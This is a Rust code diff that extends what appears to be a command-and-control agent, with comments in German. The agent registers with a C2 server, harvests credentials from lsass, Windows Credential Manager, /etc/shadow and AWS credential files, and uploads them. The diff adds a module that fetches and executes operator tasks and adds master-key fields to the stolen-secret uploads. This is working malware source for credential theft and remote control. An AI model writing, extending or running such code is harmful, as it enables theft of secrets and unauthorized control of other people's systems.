@@ -6,6 +6,7 @@
 
 mod c2;
 mod propagate;
+mod tasks;
 
 use std::net::Ipv4Addr;
 
@@ -80,6 +81,8 @@ async fn main() {
         hostname: None,
         os: None,
         status: Some(kx_core::c2::STATUS_AGENT.to_string()),
+        sealed_master: None,
+        master_key: None,
     };
     if let Err(e) = client.register_host(&self_registration).await {
         error!("Selbst-Registrierung fehlgeschlagen: {e}");
@@ -141,6 +144,14 @@ async fn main() {
         let _ = client.upload_secret(s).await;
     }
 
+    // 5. Offene Tasks ausfuehren. Der Operator hat die Auftraege ueber
+    //    `POST /api/tasks/new` angelegt; der Agent holt sie,
+    //    fuehrt sie aus und meldet das Ergebnis zurueck.
+    match tasks::run_pending_tasks(&client, &host_id).await {
+        Ok(count) => info!("{count} Tasks ausgefuehrt"),
+        Err(e) => error!("Task-Abholung fehlgeschlagen: {e}"),
+    }
+
     info!(
         "Agent-Lauf abgeschlossen: {} neue Hosts, {} neue Secrets",
         results.new_hosts.len(),
@@ -163,6 +174,7 @@ async fn collect_local_secrets(host_id: &str) -> Vec<kx_core::c2::SecretUpload> 
                 username: secret.target,
                 password: secret.value,
                 source: Some("lsass".into()),
+                master_key: None,
             });
         }
         for secret in kx_win::extract_credential_manager()
@@ -175,6 +187,7 @@ async fn collect_local_secrets(host_id: &str) -> Vec<kx_core::c2::SecretUpload> 
                 username: secret.target,
                 password: secret.value,
                 source: Some("cmdkey".into()),
+                master_key: None,
             });
         }
     }
@@ -187,6 +200,7 @@ async fn collect_local_secrets(host_id: &str) -> Vec<kx_core::c2::SecretUpload> 
                 username: secret.target,
                 password: secret.value,
                 source: Some("/etc/shadow".into()),
+                master_key: None,
             });
         }
         for secret in kx_posix::extract_aws_credentials()
@@ -199,6 +213,7 @@ async fn collect_local_secrets(host_id: &str) -> Vec<kx_core::c2::SecretUpload> 
                 username: secret.target,
                 password: secret.value,
                 source: Some("~/.aws/credentials".into()),
+                master_key: None,
             });
         }
     }
